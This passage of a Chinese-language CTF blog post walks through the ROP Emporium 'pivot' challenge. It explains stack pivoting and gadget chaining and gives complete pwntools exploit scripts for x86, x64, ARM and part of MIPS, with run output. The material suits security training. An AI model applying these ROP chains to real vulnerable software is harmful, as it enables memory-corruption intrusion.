class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">foothold_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于需要进行栈迁移，查看能够修改sp的相关gadget(存在很多)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary pivot32 --only <span class="string">&quot;leave|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080485f5 : leave ; ret</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>leave指令相当于mov esp, ebp; pop ebp</p>
</blockquote>
<p>可以利用<code>0x080485f5</code>处指令将栈帧esp指向栈基址ebp，而ebp寄存器在进行跳转前已经被修改为泄露地址，因此通过<strong>leave; ret</strong> 实现了栈迁移，其构造栈空间数据如下：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-+----------------+-</span><br><span class="line"> +  padding       +</span><br><span class="line"> +----------------+</span><br><span class="line"> + 修改的ebp       + 为pwnme函数中泄露出来的地址</span><br><span class="line"> +----------------+</span><br><span class="line"> + 0x080485f5(ra) +</span><br><span class="line"> +----------------+</span><br></pre></td></tr></table></figure>
<p>通过栈迁移，已经解决了栈空间不够的情况，接下来在新开辟的栈上需要继续构造pop链，调用ret2win函数，查看相关gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0804882C                               usefulGadgets:</span><br><span class="line">.text:0804882C 58                            pop     eax</span><br><span class="line">.text:0804882D C3                            retn</span><br><span class="line">.text:0804882D</span><br><span class="line">.text:0804882E                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804882E 94                            xchg    eax, esp</span><br><span class="line">.text:0804882F C3                            retn</span><br><span class="line">.text:0804882F</span><br><span class="line">.text:08048830                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048830 8B 00                         mov     eax, [eax]</span><br><span class="line">.text:08048832 C3                            retn</span><br><span class="line">.text:08048832</span><br><span class="line">.text:08048833                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048833 01 D8                         add     eax, ebx</span><br><span class="line">.text:08048835 C3                            retn</span><br></pre></td></tr></table></figure>
<p>可以利用<strong>pop eax</strong>和<strong>mov eax, [eax]</strong> 将foothold_function的真实地址写入eax寄存器，接下来需要将真实地址添加偏移，得到ret2win的真实地址，而 <strong>add eax, ebx</strong> 可以添加偏移，但首先需要将偏移写入ebx寄存器中，搜索写入ebx寄存器的gadget，结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary pivot32 --only <span class="string">&quot;pop|ret&quot;</span> | grep ebx</span><br><span class="line">0x08048898 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484a9 : pop ebx ; ret</span><br></pre></td></tr></table></figure>
<p>因此可以利用<code>0x080484a9</code>处指令将偏移(事先计算出来)写入ebx寄存器，再通过<strong>add eax, ebx</strong>得到ret2win真实地址，最后需要直接调用该地址，搜索相关gadget：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary pivot32 --only <span class="string">&quot;call&quot;</span> | grep eax</span><br><span class="line">0x08048592 : call dword ptr [eax + 0x51]</span><br><span class="line">0x0804858b : call dword ptr [eax - 0x73]</span><br><span class="line">0x080485f0 : call eax</span><br></pre></td></tr></table></figure>
<p>可以利用<code>0x080485f0</code>处指令直接调用eax寄存器，即调用ret2win函数。</p>
<p>综上分析，在新栈上的数据构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-+-------------------------+-</span><br><span class="line"> +  foothold_function      +</span><br><span class="line"> +-------------------------+</span><br><span class="line"> + 0x804882C(pop eax)      +</span><br><span class="line"> +-------------------------+</span><br><span class="line"> +  foothold got plt       +</span><br><span class="line"> +-------------------------+</span><br><span class="line"> + 0x8048830(mov eax,[eax])+</span><br><span class="line"> +-------------------------+</span><br><span class="line"> + 0x80484a9(pop ebx)      +</span><br><span class="line"> +-------------------------+</span><br><span class="line"> +      offset             +</span><br><span class="line"> +-------------------------+</span><br><span class="line"> + 0x8048833(add eax, ebx) +</span><br><span class="line"> +-------------------------+</span><br><span class="line"> + 0x80485f0 (call eax)    +</span><br><span class="line"> +-------------------------+</span><br></pre></td></tr></table></figure>
<h4 id="编写exp-2">编写exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">libp = ELF(<span class="string">&#x27;./libpivot32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_plt     = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>] <span class="comment"># 0x08048520</span></span><br><span class="line">foothold_got_plt = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>] <span class="comment"># 0x0804a024</span></span><br><span class="line"></span><br><span class="line">leave_ret    = <span class="number">0x080485f5</span></span><br><span class="line">pop_eax      = <span class="number">0x0804882C</span></span><br><span class="line">pop_ebx      = <span class="number">0x080484a9</span></span><br><span class="line">mov_eax_eax  = <span class="number">0x08048830</span></span><br><span class="line">add_eax_ebx  = <span class="number">0x08048833</span></span><br><span class="line">call_eax     = <span class="number">0x080485F0</span></span><br><span class="line">exit_addr    = <span class="number">0x08048510</span></span><br><span class="line"></span><br><span class="line">foothold_sym = libp.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_sym  = libp.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(ret2win_sym - foothold_sym) <span class="comment"># 0x1f7</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leakaddr  = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload_1  = p32(foothold_plt)</span><br><span class="line">payload_1 += p32(pop_eax)</span><br><span class="line">payload_1 += p32(foothold_got_plt)</span><br><span class="line">payload_1 += p32(mov_eax_eax)</span><br><span class="line">payload_1 += p32(pop_ebx)</span><br><span class="line">payload_1 += p32(offset)</span><br><span class="line">payload_1 += p32(add_eax_ebx)</span><br><span class="line">payload_1 += p32(call_eax)</span><br><span class="line">payload_1 += <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">payload_1 += p32(exit_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload_1)</span><br><span class="line"></span><br><span class="line">payload_2  = <span class="string">b&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">payload_2 += p32(leakaddr-<span class="number">4</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload_2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="运行结果-2">运行结果</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pivot32&#x27;</span>: pid 2040</span><br><span class="line">[*] <span class="string">&#x27;/home/lylan/CTF/PWN/rop_emporium_all_challenges/pivot32/pivot32&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;.&#x27;</span></span><br><span class="line">[*] <span class="string">&#x27;/home/lylan/CTF/PWN/rop_emporium_all_challenges/pivot32/libpivot32.so&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">Send a ROP chain now and it will land there</span><br><span class="line">&gt; [*] Process <span class="string">&#x27;./pivot32&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2040)</span><br><span class="line">Thank you!</span><br><span class="line"></span><br><span class="line">Now please send your stack smash</span><br><span class="line">&gt; Thank you!</span><br><span class="line">foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure></li>
<li><p>x64</p>
<p>x64和x86利用原理一致，这里只给出exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">libp = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_plt     = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>] </span><br><span class="line">foothold_got_plt = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret    = <span class="number">0x00000000004009A6</span></span><br><span class="line">pop_rax      = <span class="number">0x00000000004009BB</span></span><br><span class="line">mov_rax_rax  = <span class="number">0x00000000004009C0</span></span><br><span class="line">pop_rbp      = <span class="number">0x00000000004007C8</span></span><br><span class="line">add_rax_rbp  = <span class="number">0x00000000004009C4</span></span><br><span class="line">jmp_rax      = <span class="number">0x0000000000400803</span></span><br><span class="line">exit_addr    = <span class="number">0x0000000000400750</span></span><br><span class="line"></span><br><span class="line">foothold_sym = libp.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_sym  = libp.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(ret2win_sym - foothold_sym) </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leakaddr  = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload_1  = p64(foothold_plt)</span><br><span class="line">payload_1 += p64(pop_rax)</span><br><span class="line">payload_1 += p64(foothold_got_plt)</span><br><span class="line">payload_1 += p64(mov_rax_rax)</span><br><span class="line">payload_1 += p64(pop_rbp)</span><br><span class="line">payload_1 += p64(offset)</span><br><span class="line">payload_1 += p64(add_rax_rbp)</span><br><span class="line">payload_1 += p64(jmp_rax)</span><br><span class="line">payload_1 += p64(exit_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload_1)</span><br><span class="line"></span><br><span class="line">payload_2  = <span class="string">b&quot;A&quot;</span>*<span class="number">32</span></span><br><span class="line">payload_2 += p64(leakaddr-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload_2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="armv5-1">armv5</h3>
<p>实话来说，这道题做的时间最长，断断续续做了近1个月，主要是由于自己对ARM指令的了解不够深入导致的，不过庆幸的是最终也做了出来，这里先给出exp，详细解释有空再补。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for armv5</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,  <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./pivot_armv5&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot_armv5&#x27;</span>)</span><br><span class="line">libp = ELF(<span class="string">&#x27;./libpivot_armv5.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">foothold_plt     = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got_plt = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_sym = libp.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_sym  = libp.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(ret2win_sym - foothold_sym)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(foothold_plt), <span class="built_in">hex</span>(foothold_got_plt))</span><br><span class="line"></span><br><span class="line">puts = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leakaddr  = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sub_sp_r11_4_pop_r11_pc = <span class="number">0x000108B8</span></span><br><span class="line">ldr_r0_r0 = <span class="number">0x00010900</span></span><br><span class="line">pop_r4_r11_pc = <span class="number">0x00010908</span></span><br><span class="line">pop_r11_pc = <span class="number">0x000108BC</span></span><br><span class="line">ldr_r3_r7_blx_r3 = <span class="number">0x00010924</span></span><br><span class="line">mov_lr_r4_movs_r3_r7_bx_r3 = <span class="number">0x0001091C</span></span><br><span class="line">add_r0_r1 = <span class="number">0x0001090C</span></span><br><span class="line"></span><br><span class="line">payload_1 = p32(leakaddr)</span><br><span class="line">payload_1 += p32(pop_r4_r11_pc)</span><br><span class="line"></span><br><span class="line">payload_1 += p32(pop_r11_pc) <span class="comment"># r4-&gt;lr-&gt;bx lr</span></span><br><span class="line">payload_1 += p32(leakaddr + <span class="number">18</span> * <span class="number">4</span>) <span class="comment"># r3 r7</span></span><br><span class="line">payload_1 += p32(ldr_r3_r7_blx_r3)</span><br><span class="line"></span><br><span class="line">payload_1 += p32(leakaddr + <span class="number">0x10</span> + <span class="number">13</span>*<span class="number">4</span>) <span class="comment"># foothold_got_plt </span></span><br><span class="line">payload_1 += p32(ldr_r0_r0)</span><br><span class="line"></span><br><span class="line">payload_1 += p32(pop_r4_r11_pc) <span class="comment"># r4 -&gt; lr -&gt; bx lr</span></span><br><span class="line">payload_1 += p32(leakaddr + <span class="number">20</span> * <span class="number">4</span>) <span class="comment"># r3 r7</span></span><br><span class="line">payload_1 += p32(ldr_r3_r7_blx_r3)</span><br><span class="line"></span><br><span class="line">payload_1 += p32(leakaddr + <span class="number">0x10</span> + <span class="number">12</span> * <span class="number">4</span>) <span class="comment"># r11 offset</span></span><br><span class="line">payload_1 += p32(add_r0_r1)</span><br><span class="line"></span><br><span class="line">payload_1 += p32(offset)</span><br><span class="line">payload_1 += p32(foothold_got_plt)</span><br><span class="line">payload_1 += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line"></span><br><span class="line">payload_1 += p32(foothold_plt) <span class="comment"># r7-&gt;r3-&gt;bx r3</span></span><br><span class="line">payload_1 += p32(mov_lr_r4_movs_r3_r7_bx_r3 + <span class="number">1</span>) <span class="comment"># r3-&gt;blx r3</span></span><br><span class="line">payload_1 += p32(pop_r11_pc) <span class="comment"># r7 -&gt; r3 -&gt; bx r3</span></span><br><span class="line">payload_1 += p32(mov_lr_r4_movs_r3_r7_bx_r3 + <span class="number">1</span>) <span class="comment"># r3-&gt; blx r3</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.send(payload_1)</span><br><span class="line"></span><br><span class="line">payload_2  = <span class="string">b&quot;A&quot;</span>* <span class="number">0x20</span></span><br><span class="line">payload_2 += p32(leakaddr+<span class="number">4</span>) + p32(sub_sp_r11_4_pop_r11_pc)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.send(payload_2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,  <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>, <span class="string">&#x27;./pivot_armv5-hf&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot_armv5-hf&#x27;</span>)</span><br><span class="line">libp = ELF(<span class="string">&#x27;./libpivot_armv5-hf.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_plt     = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got_plt = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_sym = libp.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_sym  = libp.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(ret2win_sym - foothold_sym)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(foothold_plt), <span class="built_in">hex</span>(foothold_got_plt))</span><br><span class="line"></span><br><span class="line">puts = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leakaddr  = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pop_lr_pc = <span class="number">0x0001099c</span> <span class="comment"># pop &#123;r1, r2, r4, r5, r6, r7, r8, ip, lr, pc&#125;</span></span><br><span class="line">sub_sp_r11_4_pop_r11_pc = <span class="number">0x000108F0</span></span><br><span class="line">ldr_r0_r0 = <span class="number">0x0001093C</span></span><br><span class="line">pop_r4_r11_pc = <span class="number">0x00010944</span></span><br><span class="line">ldr_r3_r7_blx_r3 = <span class="number">0x00010960</span></span><br><span class="line">mov_lr_r4_movs_r3_r7_bx_r3 = <span class="number">0x00010958</span></span><br><span class="line">add_r0_r1 = <span class="number">0x00010948</span></span><br><span class="line"></span><br><span class="line">payload_1 = p32(leakaddr)</span><br><span class="line">payload_1 += p32(pop_lr_pc)</span><br><span class="line">payload_1 += <span class="string">b&quot;AAAA&quot;</span> * <span class="number">8</span></span><br><span class="line">payload_1 += p32(pop_r4_r11_pc)             </span><br><span class="line">payload_1 += p32(foothold_plt)           </span><br><span class="line"></span><br><span class="line">payload_1 += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload_1 += p32(leakaddr + <span class="number">0x10</span> + <span class="number">29</span>*<span class="number">4</span>)</span><br><span class="line">payload_1 += p32(ldr_r0_r0)</span><br><span class="line"></span><br><span class="line">payload_1 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload_1 += p32(leakaddr + <span class="number">0x10</span> + <span class="number">28</span> * <span class="number">4</span>) <span class="comment"># r11</span></span><br><span class="line">payload_1 += p32(pop_lr_pc)</span><br><span class="line"></span><br><span class="line">payload_1 += <span class="string">b&quot;DDDD&quot;</span> * <span class="number">8</span></span><br><span class="line">payload_1 += p32(pop_r4_r11_pc) <span class="comment"># lr</span></span><br><span class="line">payload_1 += p32(add_r0_r1)</span><br><span class="line">payload_1 += p32(offset)</span><br><span class="line">payload_1 += p32(foothold_got_plt)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.send(payload_1)</span><br><span class="line"></span><br><span class="line">payload_2  = <span class="string">b&quot;A&quot;</span>* <span class="number">0x20</span></span><br><span class="line">payload_2 += p32(leakaddr+<span class="number">4</span>) + p32(sub_sp_r11_4_pop_r11_pc)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.send(payload_2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="mipsel-1">mipsel</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class="string">&#x27;./pivot_mipsel&#x27;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot_mipsel&#x27;</span>)</span><br><span class="line">libp = ELF(<span 